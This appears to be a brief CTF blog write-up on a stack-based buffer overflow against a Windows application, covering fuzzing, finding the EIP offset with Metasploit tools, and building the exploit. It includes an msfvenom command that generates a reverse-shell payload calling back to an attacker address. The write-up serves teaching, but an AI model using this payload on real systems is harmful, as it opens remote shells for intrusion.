---
layout: post
title: "Buffer Overflow: Stack Based"
date: 2023-11-15
tags: [ctf, windows, binary exploitation]
author: 0xWalid
excerpt: "Understanding the basics of stack-based buffer overflows. Fuzzing, finding the offset, and generating shellcode."
---

## Fuzzing

I used a simple Python script to send an increasing number of 'A's to the target application until it crashed.

## Finding the Offset

Using `pattern_create.rb` and `pattern_offset.rb` from Metasploit, I determined the exact offset to overwrite the EIP register.

## Shellcode

I generated a reverse shell payload using msfvenom:

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -b "\x00" -f c
```

## Exploit

The final python script sent the padding, the JMP ESP address, a NOP sled, and the shellcode.
